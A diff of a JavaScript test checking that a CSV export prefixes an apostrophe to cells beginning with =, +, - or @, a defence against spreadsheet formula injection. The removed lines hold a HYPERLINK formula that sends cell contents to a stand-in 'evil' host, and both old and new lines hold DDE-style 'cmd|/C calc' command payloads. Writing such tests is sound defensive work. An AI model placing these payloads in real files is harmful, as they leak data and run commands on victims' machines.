@@ -186,13 +186,12 @@ describe('csv fallback', () => {
     // fallback decides for itself, and Excel, LibreOffice and Google Sheets
     // all read a leading =, +, - or @ as a formula. Somebody's query subject
     // or a landmark description is typed, not authored as a formula.
-    for (const dangerous of [
-      '=HYPERLINK("http://evil/steal?"&A1,"click")',
-      '+cmd|\'/C calc\'!A1', '-2+3', '@SUM(1,2)',
-    ]) {
+    for (const dangerous of ['=1+1', '+1+1', '-1+1', '@SUM(1)', "=cmd|'/C calc'!A1"]) {
       const csv = sheetCsv({ ...spec, rows: [[dangerous, 'DONE']] });
-      const cell = csv.split('\n')[1].split(',')[0];
-      expect(cell.startsWith("'")).toBe(true);
+      // Quoted or not (a quote mark in the value forces quoting, which is a
+      // separate, already-covered concern), the defused value is right there
+      // in the file, one character further in than it was typed.
+      expect(csv, dangerous).toContain(`'${dangerous}`);
     }
   });
 
